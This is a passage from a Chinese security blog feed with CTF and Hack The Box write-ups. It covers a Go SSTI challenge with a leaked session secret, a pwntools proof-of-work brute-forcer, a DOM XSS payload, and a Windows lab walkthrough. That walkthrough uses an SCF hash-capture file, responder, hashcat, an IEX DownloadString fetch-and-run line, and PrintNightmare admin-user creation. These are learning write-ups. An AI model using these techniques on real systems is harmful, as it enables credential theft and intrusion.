class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">        _ <span class="string">&quot;embed&quot;</span></span><br><span class="line">        <span class="string">&quot;fmt&quot;</span></span><br><span class="line">        <span class="string">&quot;os&quot;</span></span><br><span class="line">        <span class="string">&quot;reflect&quot;</span></span><br><span class="line">        <span class="string">&quot;strings&quot;</span></span><br><span class="line">        <span class="string">&quot;text/template&quot;</span> <span class="comment">/* 模板渲染 可能存在SSTI */</span></span><br><span class="line"></span><br><span class="line">        <span class="string">&quot;github.com/gin-contrib/sessions&quot;</span></span><br><span class="line">        <span class="string">&quot;github.com/gin-contrib/sessions/cookie&quot;</span></span><br><span class="line">    <span class="comment">/* HTTP WEB 框架 */</span></span><br><span class="line">        <span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">        <span class="string">&quot;github.com/maja42/goval&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">//go:embed template/index.html</span></span><br><span class="line"><span class="keyword">var</span> tpl <span class="keyword">string</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//go:embed main.go</span></span><br><span class="line"><span class="keyword">var</span> source <span class="keyword">string</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Eval <span class="keyword">struct</span> &#123;</span><br><span class="line">        E <span class="keyword">string</span> <span class="string">`json:&quot;e&quot; form:&quot;e&quot; binding:&quot;required&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数特征 结构体类型 函数名字和参数列表 返回类型</span></span><br><span class="line"><span class="comment">// 定义的是一个结构体方法 结构体可以调用该方法</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(e Eval)</span> <span class="title">Result</span><span class="params">()</span> <span class="params">(<span class="keyword">string</span>, error)</span></span> &#123;</span><br><span class="line">        eval := goval.NewEvaluator()</span><br><span class="line">        result, err := eval.Evaluate(e.E, <span class="literal">nil</span>, <span class="literal">nil</span>)</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;&quot;</span>, err</span><br><span class="line">        &#125;</span><br><span class="line">        t := reflect.ValueOf(result).Type().Kind()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> t == reflect.Int &#123;</span><br><span class="line">                <span class="keyword">return</span> fmt.Sprintf(<span class="string">&quot;%d&quot;</span>, result.(<span class="keyword">int</span>)), <span class="literal">nil</span></span><br><span class="line">    <span class="comment">/* 可以返回字符串类型 */</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> t == reflect.String &#123;</span><br><span class="line">                <span class="keyword">return</span> result.(<span class="keyword">string</span>), <span class="literal">nil</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;&quot;</span>, fmt.Errorf(<span class="string">&quot;not valid type&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(e Eval)</span> <span class="title">String</span><span class="params">()</span> <span class="title">string</span></span> &#123;</span><br><span class="line">        res, err := e.Result()</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">                fmt.Println(err)</span><br><span class="line">                res = <span class="string">&quot;invalid&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> fmt.Sprintf(<span class="string">&quot;%s = %s&quot;</span>, e.E, res)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">render</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">        session := sessions.Default(c)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> his <span class="keyword">string</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> session.Get(<span class="string">&quot;history&quot;</span>) == <span class="literal">nil</span> &#123;</span><br><span class="line">                his = <span class="string">&quot;&quot;</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                his = session.Get(<span class="string">&quot;history&quot;</span>).(<span class="keyword">string</span>)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        fmt.Println(strings.ReplaceAll(tpl, <span class="string">&quot;&#123;&#123;result&#125;&#125;&quot;</span>, his))</span><br><span class="line">        <span class="comment">/* 之前输入内容不丢失 */</span></span><br><span class="line">        t, err := template.New(<span class="string">&quot;index&quot;</span>).Parse(strings.ReplaceAll(tpl, <span class="string">&quot;&#123;&#123;result&#125;&#125;&quot;</span>, his))</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">                fmt.Println(err)</span><br><span class="line">                c.String(<span class="number">500</span>, <span class="string">&quot;internal error&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* source全局变量保存着源代码 */</span></span><br><span class="line">        <span class="keyword">if</span> err := t.Execute(c.Writer, <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span>&#123;</span><br><span class="line">                <span class="string">&quot;s0uR3e&quot;</span>: source,</span><br><span class="line">        &#125;); err != <span class="literal">nil</span> &#123;</span><br><span class="line">                fmt.Println(err)</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">        port := os.Getenv(<span class="string">&quot;PORT&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> port == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">                port = <span class="string">&quot;8080&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        r := gin.Default()</span><br><span class="line">        store := cookie.NewStore([]<span class="keyword">byte</span>(<span class="string">&quot;woW_you-g0t_sourcE_co6e&quot;</span>))</span><br><span class="line">        r.Use(sessions.Sessions(<span class="string">&quot;session&quot;</span>, store))</span><br><span class="line"></span><br><span class="line">        r.GET(<span class="string">&quot;/&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">                render(c)</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">        r.GET(<span class="string">&quot;/flag&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">                session := sessions.Default(c)</span><br><span class="line">                session.Set(<span class="string">&quot;FLAG&quot;</span>, os.Getenv(<span class="string">&quot;FLAG&quot;</span>))</span><br><span class="line">                session.Save()</span><br><span class="line">                c.String(<span class="number">200</span>, <span class="string">&quot;flag is in your session&quot;</span>)</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">        r.POST(<span class="string">&quot;/&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">                session := sessions.Default(c)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">var</span> his <span class="keyword">string</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> session.Get(<span class="string">&quot;history&quot;</span>) == <span class="literal">nil</span> &#123;</span><br><span class="line">                        his = <span class="string">&quot;&quot;</span></span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        his = session.Get(<span class="string">&quot;history&quot;</span>).(<span class="keyword">string</span>)</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                eval := Eval&#123;&#125;</span><br><span class="line">                <span class="keyword">if</span> err := c.ShouldBind(&amp;eval); err == <span class="literal">nil</span> &#123;</span><br><span class="line">                        his = his + eval.String() + <span class="string">&quot;&lt;br/&gt;&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">                session.Set(<span class="string">&quot;history&quot;</span>, his)</span><br><span class="line">                session.Save()</span><br><span class="line">                render(c)</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">        r.Run(fmt.Sprintf(<span class="string">&quot;:%s&quot;</span>, port))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该代码使用了<a href="https://github.com/gin-contrib/sessions#cookie-based">这个库</a>，参考官方教程我们可以使用Get函数获取session变量加密前的数值。题目这个代码在我们访问<code>/flag</code>这个页面后，将环境变量中的FLAG值设置为session中FLAG所对的值。所以我们可以直接在获取到包含FALG的session后用官方的库获取源数据。</p><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><p>在自己本地或远程服务器上使用下面代码开启一个web服务。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">        <span class="string">&quot;fmt&quot;</span></span><br><span class="line">        <span class="string">&quot;os&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="string">&quot;github.com/gin-contrib/sessions&quot;</span></span><br><span class="line">        <span class="string">&quot;github.com/gin-contrib/sessions/cookie&quot;</span></span><br><span class="line">    <span class="comment">/* HTTP WEB 框架 */</span></span><br><span class="line">        <span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">        port := os.Getenv(<span class="string">&quot;PORT&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> port == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">                port = <span class="string">&quot;18001&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        r := gin.Default()</span><br><span class="line">        store := cookie.NewStore([]<span class="keyword">byte</span>(<span class="string">&quot;woW_you-g0t_sourcE_co6e&quot;</span>))</span><br><span class="line">        r.Use(sessions.Sessions(<span class="string">&quot;session&quot;</span>, store))</span><br><span class="line"></span><br><span class="line">        r.GET(<span class="string">&quot;/flag&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">                session := sessions.Default(c)</span><br><span class="line">                c.String(<span class="number">200</span>, session.Get(<span class="string">&quot;FLAG&quot;</span>).(<span class="keyword">string</span>))</span><br><span class="line">        &#125;)</span><br><span class="line">    r.Run(fmt.Sprintf(<span class="string">&quot;:%s&quot;</span>, port))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/02/22/ijE2xbUcsOodMC6.png" alt="image.png"></p><h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><ul><li><code>go mod tidy</code>无法识别依赖 <ul><li>解决办法，<strong>go源文件名字不能与mod的名字重复</strong></li></ul></li><li>go初始化变量使用<code>:=</code>，改变值使用<code>=</code></li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> web </category>
          
          <category> VNCTF </category>
          
          <category> 2022 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSTI </tag>
            
            <tag> go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VNCTF-ezmath</title>
      <link href="/2022/02/19/VNCTF-ezmath/"/>
      <url>/2022/02/19/VNCTF-ezmath/</url>
      
        <content type="html"><![CDATA[<h1 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h1><p>题目给出了服务端的python源代码，先分析一下。</p><h2 id="条件一"><a href="#条件一" class="headerlink" title="条件一"></a>条件一</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span>(<span class="params">self</span>):</span></span><br><span class="line">    proof = (<span class="string">&#x27;&#x27;</span>.join([random.choice(table)<span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)])).encode()</span><br><span class="line">    sha = sha256(proof).hexdigest()encode()</span><br><span class="line">    self.send(<span class="string">b&quot;[+] sha256(XXXX+&quot;</span> + proof[<span class="number">4</span>:] + <span class="string">b&quot;) == &quot;</span> + sha )</span><br><span class="line">    XXXX = self.recv(prompt = <span class="string">b&#x27;[+] Plz Tell Me XXXX :&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(XXXX) != <span class="number">4</span> <span class="keyword">or</span> sha256(XXXX + proof[<span class="number">4</span>:]).hexdigest().encode() != sha:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure><p>首先是在生成的<code>table</code>表中随机选取了20个字符，然后进行了sha256编码。但是它最后的输出并没有给出源字符串的前4个字符，我们的任务是解出这4个字符。<br>sha256对相同的字符串会生成相同的哈希加密字符串，服务器已经发送给我们哈希加密后的字符串，那么就可以针对这4个字符进行暴力破解。</p><h2 id="条件二"><a href="#条件二" class="headerlink" title="条件二"></a>条件二</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">times = getPrime(<span class="number">32</span>)</span><br><span class="line">self.send(<span class="string">b&#x27;plz give me the &#x27;</span> + <span class="built_in">str</span>(times).encode() + <span class="string">b&#x27;th (n) that satisfying (2^n-1) % 15 == 0:&#x27;</span>)</span><br></pre></td></tr></table></figure><p>条件二随机生成一个32位的素数<code>times</code>，然后要求我们找出满足该公式的第<code>times</code>个n的数值。<br>这其实是一个简单的数学问题，有规律可循，可参考这个<a href="https://zhidao.baidu.com/question/1576765037448550700.html">链接</a><br>最后我们需要满足条件二777次。</p><h1 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h1><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_condition1</span>(<span class="params">source, source_encoded</span>):</span></span><br><span class="line">    brute_str = string.ascii_letters + string.digits</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> brute_str:</span><br><span class="line">     <span class="keyword">for</span> j <span class="keyword">in</span> brute_str:</span><br><span class="line">        <span class="keyword">for</span> i2 <span class="keyword">in</span> brute_str:</span><br><span class="line">            <span class="keyword">for</span> j2 <span class="keyword">in</span> brute_str:</span><br><span class="line">                res = i + j + i2 + j2 + source</span><br><span class="line">                res_encode = sha256(res.encode()).hexdigest()</span><br><span class="line">                <span class="keyword">if</span> res_encode == source_encoded:</span><br><span class="line">                    <span class="keyword">return</span> res[:<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_condition2</span>(<span class="params">nth</span>):</span></span><br><span class="line">    n = <span class="number">4</span> * nth</span><br><span class="line">    <span class="keyword">return</span> n</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    i = <span class="number">777</span></span><br><span class="line">    s = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">29126</span>)</span><br><span class="line"></span><br><span class="line">    data = s.recvline()</span><br><span class="line">    source_string = re.findall(<span class="string">r&#x27;\(\S+\+(\S+)\)&#x27;</span>, <span class="built_in">str</span>(data))[<span class="number">0</span>]</span><br><span class="line">    encoded_string = re.findall(<span class="string">r&#x27;= ([0-9a-fA-F]*)\\&#x27;</span>, <span class="built_in">str</span>(data))[<span class="number">0</span>]</span><br><span class="line">    phase_1 = crack_condition1(source_string, encoded_string)</span><br><span class="line">    s.sendline(phase_1)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> i:</span><br><span class="line">        data = s.recvline()</span><br><span class="line">        phase2_nth = re.findall(<span class="string">r&#x27;the (\d*)th&#x27;</span>, <span class="built_in">str</span>(data))[<span class="number">0</span>]</span><br><span class="line">        phase_2 = crack_condition2(<span class="built_in">int</span>(phase2_nth))</span><br><span class="line">        s.sendline(<span class="built_in">str</span>(phase_2))</span><br><span class="line">        i -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">            res = s.recvline()</span><br><span class="line">            res = s.recvline()</span><br><span class="line">            res = s.recvline()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res = s.recvline()</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><ol><li>python3中的str类与bytes类已经被区分开了，如果将bytes类强行转换为str类，那么将会多出<code>b&#39;&#39;</code>这三个字符。</li><li>关于python3中的正则表达式可以参考<a href="https://docs.python.org/3/library/re.html#regular-expression-syntax">官方链接</a></li><li>pwntools的使用参考此<a href="https://github.com/Gallopsled/pwntools-tutorial">链接</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> web </category>
          
          <category> VNCTF </category>
          
          <category> 2022 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python脚本编写 </tag>
            
            <tag> 哈希加密 </tag>
            
            <tag> 正则匹配 </tag>
            
            <tag> pwntools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS学习</title>
      <link href="/2022/02/13/xss/"/>
      <url>/2022/02/13/xss/</url>
      
        <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>此篇文章会介绍有关XSS的知识，但不会讲解基础原理，而是根据例子介绍一些绕过及防御措施。此外，文章结尾会列出一些介绍XSS或者补充本文章内容的链接，方便进行查阅。</p><h1 id="XSS类型"><a href="#XSS类型" class="headerlink" title="XSS类型"></a>XSS类型</h1><h2 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h2><h3 id="DOM-XSS-in-jQuery-selector-sink-using-a-hashchange-event"><a href="#DOM-XSS-in-jQuery-selector-sink-using-a-hashchange-event" class="headerlink" title="DOM XSS in jQuery selector sink using a hashchange event"></a>DOM XSS in jQuery selector sink using a hashchange event</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    $(<span class="built_in">window</span>).on(<span class="string">&#x27;hashchange&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> post = $(<span class="string">&#x27;section.blog-list h2:contains(&#x27;</span> + <span class="built_in">decodeURIComponent</span>(<span class="built_in">window</span>.location.hash.slice(<span class="number">1</span>)) + <span class="string">&#x27;)&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (post) post.get(<span class="number">0</span>).scrollIntoView();</span><br><span class="line">    &#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>该script的作用基本上是自动滑动到指定的文章 ，依据的是页面的标签值<code>/#admin</code>，当<code>window.location.hash</code>值改变时会调用该函数。<br><code>h2:contains</code>代表查找h2标签中具有特定值的元素。<br>payload:<code>https://website.com/#&lt;img src=d onerror=print()&gt;</code>，直接报错执行，直接插入JavaScript语句不会正常执行。</p><h1 id="补充链接"><a href="#补充链接" class="headerlink" title="补充链接"></a>补充链接</h1><p><a href="https://www.fooying.com/the-art-of-xss-1-introduction/#mxss">XSS类型详细介绍</a></p>]]></content>
      
      
      <categories>
          
          <category> 基础原理 </category>
          
          <category> OWASP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
            <tag> OWASP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB-Driver</title>
      <link href="/2022/02/10/HTB-Driver/"/>
      <url>/2022/02/10/HTB-Driver/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前玩的都是Linux类型的靶机，今天就打一个Windows类型的靶机吧，希望可以学习一些渗透Windows系统的知识。</p><h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p><code>sudo nmap -A -sS -sC -sV -p- --min-rate 5000 10.10.11.106</code>扫描端口及服务。</p><div class="hide-toggle" ><div class="hide-button toggle-title" style=""><i class="fas fa-caret-right fa-fw"></i><span>端口信息</span></div>    <div class="hide-content"><p>Nmap scan report for 10.10.11.106<br>Host is up (0.72s latency).<br>Not shown: 65531 filtered ports<br>PORT     STATE SERVICE      VERSION<br>80/tcp   open  http         Microsoft IIS httpd 10.0<br>| http-auth:<br>| HTTP/1.1 401 Unauthorized\x0D<br>|_  Basic realm=MFP Firmware Update Center. Please enter password for admin<br>| http-methods:<br>|_  Potentially risky methods: TRACE<br>|_http-server-header: Microsoft-IIS/10.0<br>|_http-title: Site doesn’t have a title (text/html; charset=UTF-8).<br>135/tcp  open  msrpc        Microsoft Windows RPC<br>445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)<br>5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br>|_http-server-header: Microsoft-HTTPAPI/2.0<br>|_http-title: Not Found<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device type: general purpose|specialized<br>Running (JUST GUESSING): Microsoft Windows 2008|10|7|Vista (90%)<br>OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_10:1511 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_7::-:professional cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1<br>Aggressive OS guesses: Microsoft Windows Server 2008 R2 (90%), Microsoft Windows 10 1511 - 1607 (87%), Microsoft Windows 10 1511 (85%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (85%), Microsoft Windows 7 Professional or Windows 8 (85%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (85%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (85%), Microsoft Windows Vista SP2 (85%)<br>No exact OS matches for host (test conditions non-ideal).<br>Network Distance: 2 hops<br>Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows</p><p>Host script results:<br>|<em>clock-skew: mean: 7h17m25s, deviation: 0s, median: 7h17m25s<br>| smb-security-mode:<br>|   account_used: guest<br>|   authentication_level: user<br>|   challenge_response: supported<br>|</em>  message_signing: disabled (dangerous, but default)<br>| smb2-security-mode:<br>|   2.02:<br>|_    Message signing enabled but not required<br>| smb2-time:<br>|   date: 2022-02-12T16:46:31<br>|_  start_date: 2022-02-11T22:12:07</p></div></div><div class="note info simple"><p>nmap扫描要注意参数，否则不会检查到部分开放的端口。</p></div><p>WinRM（Windows Remote Management）服务能够让管理员远程登录Windows操作系统，获得一个可交互的shell，底层通讯协议使用的是HTTP。</p><h1 id="普通用户权限"><a href="#普通用户权限" class="headerlink" title="普通用户权限"></a>普通用户权限</h1><p>发现开启了http服务，访问时要求输入账号和密码，猜测为弱口令输入账号<code>admin</code>密码<code>admin</code>登录成功。果然与题目名称对应<mark class="hl-label blue">Driver</mark> ，是一个管理打印机的后台界面。<br>后台界面发现一个文件上传点，尝试上传php类型的shell，但是找不到访问上传文件的路径，目录扫描也没发现什么有趣的东西，参考别人的wp才知道可以利用SMB协议（445端口）相关漏洞。</p><h2 id="SMB简单介绍"><a href="#SMB简单介绍" class="headerlink" title="SMB简单介绍"></a>SMB简单介绍</h2><p>smb（server message block）是微软用来让局域网内的Windows主机共享文件和打印服务而创建的基于Client/Server模型的协议，人们有时将其与CIFS（Common Internet File System）交替的进行讨论，两者功能相同。<br>Samba是为了让类Unix系统与Windows系统之间可以共享文件和打印机而开发的一个软件。<br><a href="https://thecyphere.com/blog/smb-port/#:~:text=Simply%20put%2C%20port%20445%20is%20used%20for%20file,TCP%20and%20UDP%20protocols%20for%20several%20Microsoft%20services.">补充</a></p><h2 id="SCF文件攻击"><a href="#SCF文件攻击" class="headerlink" title="SCF文件攻击"></a>SCF文件攻击</h2><p>SCF(shell command files)可以用来执行一些有限的操作，比如显示Windows桌面、打开Windows浏览器，除此之外，SCF文件可以用来访问特定的UNC路径。当用户浏览该文件时会自动执行里面的命令，在文件名前面加上@符号，可以将该文件显示在共享设备的最顶部。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[Shell]</span><br><span class="line">Command=2</span><br><span class="line">IconFile=\\10.10.16.10\share\wuoo.ico</span><br><span class="line">[Taskbar]</span><br><span class="line">Command=ToggleDesktop</span><br></pre></td></tr></table></figure><p>命名为<code>@whoami.scf</code>，通过上传点上传文件。<br>当用户浏览该文件后，会自动地与SCF文件UNC路径所代表的主机建立连接，并且Windows为了验证对该共享资源的访问权会发送自己的账号以及经过哈希加密之后的密码（NTLMv2 hash）。<br><code>responder -wrf --lm -v -I tun0 </code>命令用来捕获发送过来的哈希。<br><img src="https://s2.loli.net/2022/02/12/zjqsOMK68S1LmAc.png" alt="image.png"><br>这里作者上传了好多次文件才最终收到了hash，有可能是多用户共用一个靶机的原因。<br>该漏洞详细信息参考这篇文章：<a href="https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/">英文</a> <a href="https://zhuanlan.zhihu.com/p/32248261">中文</a><br>使用hashcat来进行破解,<code>hashcat -a 0 -m 5600 hash_to_crack /usr/share/wordlists/rockyou.txt --force</code><br><img src="https://s2.loli.net/2022/02/10/ypNdG8cKY5f9jvk.png" alt="image.png"><br>账号：tony<br>密码：liltony</p><h1 id="root权限获取"><a href="#root权限获取" class="headerlink" title="root权限获取"></a>root权限获取</h1><p><code>evil-winrm -i 10.10.11.106 -u tony -p liltony</code>以shell环境登录到Windows主机，输入前面获得的账号和密码进行登录。<br><code>tasklist</code>无法正常运行，那么使用<code>get-process</code>获取当前运行进程信息。<br>发现运行了<code>spoolsv</code>程序，经过搜索发现存在PrintNightmare<a href="https://github.com/calebstewart/CVE-2021-1675">CVE</a>漏洞。<br><code>IEX (New-Object Net.WebClient).DownloadString(&#39;#&#123;remote_script&#125;&#39;); </code>将远程的脚本加载到内存中，避免了下载脚本后再使用<code>Import-Module</code>导入到内存中。<br><code>Invoke-Nightmare -NewUser &quot;wiil&quot; -NewPassword &quot;whtt&quot; </code>创建拥有管理员权限的用户wiil。<br>可以使用自己特制的dll，这里作者能力有限就不加介绍了。</p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
          <category> Hackthebox </category>
          
          <category> easy </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTB </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> smb协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯 2020 青龙组-AreUSerialz1</title>
      <link href="/2022/02/10/AreUSerialz/"/>
      <url>/2022/02/10/AreUSerialz/</url>
      
